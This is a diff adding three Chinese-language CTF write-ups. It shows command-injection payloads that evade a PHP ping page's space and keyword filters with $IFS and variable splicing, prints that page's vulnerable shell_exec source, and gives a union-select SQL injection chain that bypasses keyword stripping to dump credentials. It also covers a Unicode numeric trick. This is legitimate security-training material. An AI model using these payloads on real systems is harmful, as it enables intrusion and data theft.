@@ -1007,3 +1007,79 @@ print (urllib.parse.quote(poc))
 得到flag
 
 ----
+# [GXYCTF2019]Ping Ping Ping
+打开就是一个get请求，输入`ip=127.0.0.1`：
+```
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+```
+发现是一个ping命令，但是fuck了空格和符号
+```
+ip=127.0.0.1%20     #这样会被fuck
+ip=127.0.0.1$IFS$1  #这样没事
+ip=127.0.0.1;       #这样没事
+```
+尝试使用`ip=127.0.0.1;ls`：
+```
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+flag.php
+index.php
+```
+尝试使用`ip=127.0.0.1;cat$IFS$1flag.php`读取flag.php：
+```
+fxck your flag!
+```
+查看index.php
+```
+/?ip=
+|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
+    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
+    die("fxck your symbol!");
+  } else if(preg_match("/ /", $ip)){
+    die("fxck your space!");
+  } else if(preg_match("/bash/", $ip)){
+    die("fxck your bash!");
+  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
+    die("fxck your flag!");
+  }
+  $a = shell_exec("ping -c 4 ".$ip);
+  echo "
+
+";
+  print_r($a);
+}
+
+?>
+```
+使用变量绕过`ip=127.0.0.1;q=l;w=a;e=f;r=g;t=.php;cat$IFS$9$e$q$w$r$t`。  
+得到flag
+
+----
+# [ASIS 2019]Unicorn shop
+打开是叫我买unicorn，然后在字符编码utf8那一行提示注意很重要。输入item为1，price不输入，发现报错`unicodedata.numeric(price)`，发现这个判断字符在unicode中是否代表数字的函数，于是到[这个网站](https://www.compart.com/en/unicode/)上搜索thousand，随便找一个大的，我选择的`ↁ`这个，输入item号，提交就行。  
+得到flag
+
+----
+# [极客大挑战 2019]BabySQL
+打开又是一个注入：
+```
+自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！
+```
+看上去挺强。sqlmap测试后发现被出题人嘲讽了，看来要么写temper，要么手工注入。先测试一下关键字，发现大多是关键字被删除，我们使用`<>`来绕过（当然这里也能双写）：
+```
+check.php?username=admin&password=1' uni<>on sel<>ect 1,2,3%23
+# 选择3位置显示
+
+check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(table_name) fr<>om info<>rmation_schema.tables wh<>ere table_schema = database()%23
+# b4bsql,geekuser
+
+check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(column_name) fr<>om info<>rmation_schema.columns wh<>ere table_name = 'b4bsql'%23
+# id,username,password
+
+check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(username) fr<>om b4bsql%23
+#cl4y,sql,porn,git,Stop,badguy,hacker,flag
+
+check.php?username=admin&password=1' uni<>on sel<>ect 1,2,group_concat(passwo<>rd) fr<>om b4bsql wh<>ere username='flag'%23
+```
+得到flag
+
+----
